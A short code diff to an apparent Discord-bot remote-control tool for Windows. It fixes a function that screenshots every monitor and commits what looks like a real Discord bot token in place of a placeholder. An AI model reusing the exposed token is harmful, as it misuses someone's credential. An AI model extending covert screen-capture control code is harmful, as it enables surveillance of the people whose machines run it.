@@ -1,7 +1,7 @@
 import os, sys
 import discord
 from discord.ext import commands
-from mss import mss
+import mss
 import cv2
 import win32api
 import ctypes
@@ -802,9 +802,9 @@ class Helper:
 
   def grabScreenshot():
     with mss.mss() as sct:
-      monitor_count = len(sct.monitors)
-    for i in range(monitor_count):
-      mss().shot(mon=i)
+      monitor_count = len(sct.monitors)   
+      for i in range(monitor_count):
+        mss.mss().shot(mon=i)
 
   def getTime():
     time = os.popen('time /t').read()
@@ -821,7 +821,7 @@ class Helper:
 
 
 # ---- Bot code starts here ----
-token = 'FAKEAHHTOKEN'  # DONT COMMIT THIS PLEASE!
+token = 'MTEzODU0OTQwMzc4Nzk5MzEwOA.GEHEUY.cWnzmienEleQGFSwbM8_YifB1emnsppF293o68'  # DONT COMMIT THIS PLEASE!
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 
